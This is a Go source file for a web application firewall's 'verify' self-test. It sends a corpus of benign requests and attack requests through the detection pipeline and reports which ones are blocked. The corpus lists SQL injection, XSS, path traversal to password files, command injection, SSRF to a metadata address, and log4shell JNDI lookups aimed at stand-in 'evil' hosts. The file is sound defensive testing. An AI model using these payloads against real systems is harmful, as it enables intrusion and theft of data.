package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/jackby03/waffynx/internal/appsec"
	"github.com/jackby03/waffynx/internal/catalog"
	"github.com/jackby03/waffynx/internal/config"
	"github.com/jackby03/waffynx/internal/engine"
	"github.com/jackby03/waffynx/internal/plugin"
	"github.com/jackby03/waffynx/internal/policy"
	wrules "github.com/jackby03/waffynx/internal/rules"
)

// verifyCase is one functional check: a request and what the WAF must do with it.
type verifyCase struct {
	Name   string
	Method string
	Path   string
	Body   string
	Header map[string]string
	// WantBlock is the behaviour a WAF is supposed to have, not what the code
	// currently does. Mismatches are the point of the tool.
	WantBlock bool
	// RequiresBlockingPlugins names plugins that must be enabled *and* in block
	// mode for WantBlock to be a valid expectation. If any is not, the case is
	// reported as skipped: allowing the request is then correct for that config,
	// not a detection gap.
	RequiresBlockingPlugins []string
}

// verifyCorpus covers the attack classes the parsers and the request-validation
// plugin claim to handle, plus benign traffic that must never be blocked.
var verifyCorpus = []verifyCase{
	// --- Managed ruleset: classes only the catalog covers ---
	//
	// These exist because the plugin chain never inspected headers, user agents or
	// sensitive paths. If the catalog is not wired, they fail instead of passing
	// quietly.
	{Name: "catalog: scanner user-agent", Method: "GET", Path: "/", Header: map[string]string{"User-Agent": "Nikto/2.5.0"}, WantBlock: true},
	{Name: "catalog: log4shell in header", Method: "GET", Path: "/", Header: map[string]string{"X-Api-Version": "${jndi:ldap://evil/a}"}, WantBlock: true},
	{Name: "catalog: vcs config file", Method: "GET", Path: "/.git/config", WantBlock: true},
	{Name: "catalog: ssrf metadata", Method: "GET", Path: "/fetch?url=http://169.254.169.254/latest/meta-data", WantBlock: true},
	{Name: "catalog: sqlmap user-agent", Method: "GET", Path: "/", Header: map[string]string{"User-Agent": "sqlmap/1.7.2"}, WantBlock: true},

	// --- Benign traffic: blocking any of this is a false positive ---
	{Name: "benign: root", Method: "GET", Path: "/"},
	{Name: "benign: pagination", Method: "GET", Path: "/api/users?page=2&limit=50"},
	{Name: "benign: prose query", Method: "GET", Path: "/search?q=how+to+bake+bread"},
	{Name: "benign: restful path", Method: "GET", Path: "/products/nike-air-max-90"},
	{Name: "benign: date range", Method: "GET", Path: "/api/v1/reports?from=2026-01-01&to=2026-02-01"},
	{Name: "benign: json body", Method: "POST", Path: "/api/orders", Body: `{"items":[{"sku":"A-1","qty":2}]}`,
		Header: map[string]string{"Content-Type": "application/json"}},
	{Name: "benign: browser UA", Method: "GET", Path: "/",
		Header: map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}},
	{Name: "benign: apostrophe in prose", Method: "GET", Path: "/blog/why-waf-matters",
		Body: "It's a good question — we'll cover it."},

	// --- SQL injection ---
	{Name: "sqli: quote-or", Method: "GET", Path: "/users?id=1' OR '1'='1", WantBlock: true},
	{Name: "sqli: union select", Method: "GET", Path: "/users?id=1 UNION SELECT password FROM users", WantBlock: true},
	{Name: "sqli: comment terminator", Method: "GET", Path: "/login?user=admin'--", WantBlock: true},
	{Name: "sqli: in body", Method: "POST", Path: "/login", Body: "username=admin'--&password=x", WantBlock: true},

	// --- Cross-site scripting ---
	{Name: "xss: script tag", Method: "GET", Path: "/search?q=<script>alert(1)</script>", WantBlock: true},
	{Name: "xss: img onerror", Method: "GET", Path: "/p?n=<img src=x onerror=alert(1)>", WantBlock: true},
	{Name: "xss: svg onload", Method: "GET", Path: "/p?n=<svg/onload=alert(1)>", WantBlock: true},

	// --- Path traversal / LFI ---
	{Name: "traversal: dotdot", Method: "GET", Path: "/../../../../etc/passwd", WantBlock: true},
	{Name: "traversal: file param", Method: "GET", Path: "/download?file=../../etc/shadow", WantBlock: true},

	// --- Command injection ---
	{Name: "cmdi: semicolon", Method: "GET", Path: "/ping?host=127.0.0.1;cat /etc/passwd", WantBlock: true},
	{Name: "cmdi: backticks", Method: "GET", Path: "/ping?host=`id`", WantBlock: true},

	// --- Scanner / exploit tooling signatures ---
	{Name: "scanner: sqlmap", Method: "GET", Path: "/",
		Header:                  map[string]string{"User-Agent": "sqlmap/1.7#stable"},
		WantBlock:               true,
		RequiresBlockingPlugins: []string{"bot-protection"}},
	{Name: "exploit: log4shell probe", Method: "GET", Path: "/a=${jndi:ldap://evil.example/a}", WantBlock: true},
}

// discardResponseWriter satisfies http.ResponseWriter for plugins that need one
// but whose response we do not care about, because Decide reports the verdict.
type discardResponseWriter struct {
	header http.Header
}

func (d *discardResponseWriter) Header() http.Header {
	if d.header == nil {
		d.header = make(http.Header)
	}
	return d.header
}

func (d *discardResponseWriter) Write(b []byte) (int, error) { return len(b), nil }
func (d *discardResponseWriter) WriteHeader(int)             {}

type verifyResult struct {
	Name       string `json:"name"`
	Want       string `json:"want"`
	Got        string `json:"got"`
	Stage      string `json:"stage,omitempty"`
	RuleID     string `json:"rule_id,omitempty"`
	Reason     string `json:"reason,omitempty"`
	Passed     bool   `json:"passed"`
	Skipped    bool   `json:"skipped"`
	SkipReason string `json:"skip_reason,omitempty"`
}

// buildVerifySidecar wires the same components runEngine wires, so the check
// exercises the configured plugin set and scorer rather than a hardcoded one.
func buildVerifySidecar(cfg *config.Config) (*engine.Sidecar, error) {
	chain := plugin.NewChain()
	registry := engine.GetPluginRegistry()
	for _, pc := range cfg.Plugins {
		if !pc.Enabled {
			continue
		}
		p, err := registry.Create(pc.Name, pc.Config)
		if err != nil {
			fmt.Fprintf(os.Stderr, "warning: plugin %q could not be loaded: %v\n", pc.Name, err)
			continue
		}
		chain.Add(p)
	}

	var scorer appsec.Scorer
	if cfg.AppSec.Enabled {
		if cfg.AppSec.Engine == "open-appsec" && cfg.AppSec.BridgeSocket != "" {
			scorer = appsec.NewBridgeScorer(cfg.AppSec.BridgeSocket, 2*time.Second)
		} else {
			scorer = appsec.NewBasicScorer()
		}
	}

	sc := engine.NewSidecar("", policy.NewRuleEngine(), chain, scorer, nil, nil, wrules.NewEngine(), nil)

	// The self-test must exercise the same ruleset the binary ships, or it would
	// keep passing while the catalog was broken or empty.
	managed, err := catalog.Embedded()
	if err != nil {
		return nil, fmt.Errorf("loading the embedded ruleset: %w", err)
	}
	sc.SetCatalog(managed)
	return sc, nil
}

func runVerify(cfg *config.Config, asJSON bool, out io.Writer) error {
	s, err := buildVerifySidecar(cfg)
	if err != nil {
		return err
	}

	pluginModes := make(map[string]string)
	for _, pc := range cfg.Plugins {
		mode, _ := pc.Config["mode"].(string)
		if mode == "" {
			mode = "block"
		}
		pluginModes[pc.Name] = mode
	}

	results := make([]verifyResult, 0, len(verifyCorpus))
	failures := 0
	skipped := 0

	for _, tc := range verifyCorpus {
		req := &policy.Request{
			Method:   tc.Method,
			Host:     "verify.local",
			Path:     tc.Path,
			RemoteIP: "198.51.100.10",
			Headers:  map[string][]string{},
		}
		var body []byte
		if tc.Body != "" {
			body = []byte(tc.Body)
			req.Body = body
		}

		// The pipeline reads the original request from the X-WN-* headers that
		// the nginx module sets, so the probe request mirrors that contract.
		probe, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "http://verify.local/evaluate", nil)
		if err != nil {
			return fmt.Errorf("building probe request: %w", err)
		}
		probe.Header.Set("X-WN-M", tc.Method)
		probe.Header.Set("X-WN-H", req.Host)
		probe.Header.Set("X-WN-U", tc.Path)
		probe.Header.Set("X-WN-IP", req.RemoteIP)
		for k, v := range tc.Header {
			key := http.CanonicalHeaderKey(k)
			// Mirror what handleEvaluate builds from the X-WN-* contract: the
			// canonical header is in Headers AND the nginx-style header is on the
			// probe. The self-test used to set only the probe header, so rules that
			// read Headers (the catalog's user-agent signatures) never fired here
			// even though they fire in production.
			req.Headers[key] = []string{v}
			switch key {
			case "User-Agent":
				probe.Header.Set("X-WN-UA", v)
			case "Content-Type":
				probe.Header.Set("X-WN-CT", v)
			case "Referer":
				probe.Header.Set("X-WN-Ref", v)
			}
		}
		if len(body) > 0 {
			req.Headers["Content-Type"] = []string{probe.Header.Get("X-WN-CT")}
		}

		decision := s.Decide(&discardResponseWriter{}, probe, req, body)

		got := "allow"
		if !decision.Allow {
			got = "block"
		}
		want := "allow"
		if tc.WantBlock {
			want = "block"
		}

		if reason, skip := skipReason(tc, pluginModes); skip {
			results = append(results, verifyResult{
				Name:       tc.Name,
				Want:       want,
				Got:        got,
				Skipped:    true,
				SkipReason: reason,
			})
			skipped++
			continue
		}

		res := verifyResult{
			Name:   tc.Name,
			Want:   want,
			Got:    got,
			Stage:  decision.Stage,
			RuleID: decision.RuleID,
			Reason: decision.Reason,
			Passed: got == want,
		}
		if !res.Passed {
			failures++
		}
		results = append(results, res)
	}

	if asJSON {
		enc := json.NewEncoder(out)
		enc.SetIndent("", "  ")
		payload := map[string]interface{}{
			"cases":    results,
			"total":    len(results),
			"failed":   failures,
			"skipped":  skipped,
			"passed":   len(results) - failures - skipped,
			"all_pass": failures == 0,
		}
		if err := enc.Encode(payload); err != nil {
			return err
		}
	} else {
		var report strings.Builder
		fmt.Fprintf(&report, "Waffynx functional self-test\n")
		fmt.Fprintf(&report, "  plugins: %d enabled   scorer: %s\n\n", countEnabledPlugins(cfg), scorerName(cfg))
		fmt.Fprintf(&report, "  %-4s %-28s %-6s %-6s %s\n", "", "CASE", "WANT", "GOT", "DETAIL")
		for _, r := range results {
			mark := "ok  "
			switch {
			case r.Skipped:
				mark = "skip"
			case !r.Passed:
				mark = "FAIL"
			}
			detail := ""
			if r.Skipped {
				detail = r.SkipReason
			}
			if r.Got == "block" && !r.Skipped {
				detail = r.RuleID
				if r.Reason != "" {
					detail += ": " + truncate(r.Reason, 48)
				}
			}
			fmt.Fprintf(&report, "  %-4s %-28s %-6s %-6s %s\n", mark, r.Name, r.Want, r.Got, detail)
		}
		fmt.Fprintf(&report, "\n  %d passed, %d failed, %d skipped (of %d)\n", len(results)-failures-skipped, failures, skipped, len(results))
		if _, err := io.WriteString(out, report.String()); err != nil {
			return fmt.Errorf("writing report: %w", err)
		}
	}

	if failures > 0 {
		return fmt.Errorf("%d of %d checks failed", failures, len(results))
	}
	return nil
}

// skipReason reports why a case cannot be judged under the current config.
func skipReason(tc verifyCase, pluginModes map[string]string) (string, bool) {
	for _, name := range tc.RequiresBlockingPlugins {
		mode, enabled := pluginModes[name]
		if !enabled {
			return name + " not enabled", true
		}
		if mode != "block" {
			return name + " mode=" + mode, true
		}
	}
	return "", false
}

func countEnabledPlugins(cfg *config.Config) int {
	n := 0
	for _, p := range cfg.Plugins {
		if p.Enabled {
			n++
		}
	}
	return n
}

func scorerName(cfg *config.Config) string {
	if !cfg.AppSec.Enabled {
		return "disabled"
	}
	if cfg.AppSec.Engine == "open-appsec" && cfg.AppSec.BridgeSocket != "" {
		return "open-appsec bridge"
	}
	return "basic-go"
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-3] + "..."
}

// newVerifyCmd reports what the engine would do with a corpus of benign and
// malicious requests, using the same pipeline that serves live traffic.
func newVerifyCmd(cfgFile *string) *cobra.Command {
	var asJSON bool
	cmd := &cobra.Command{
		Use:   "verify",
		Short: "Run a functional self-test of the inspection engine",
		Long: `Runs a corpus of benign and malicious requests through the real inspection
pipeline (plugins, custom rules, policy engine, ML scorer) and reports whether
each one was allowed or blocked as a WAF should.

This validates the decision engine only. It does not exercise nginx, the Unix
socket transport or the TLS layer — for that, send traffic to a running instance.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := config.Load(*cfgFile)
			if err != nil {
				return fmt.Errorf("loading config: %w", err)
			}
			return runVerify(cfg, asJSON, os.Stdout)
		},
	}
	cmd.Flags().BoolVar(&asJSON, "json", false, "emit machine-readable JSON")
	return cmd
}
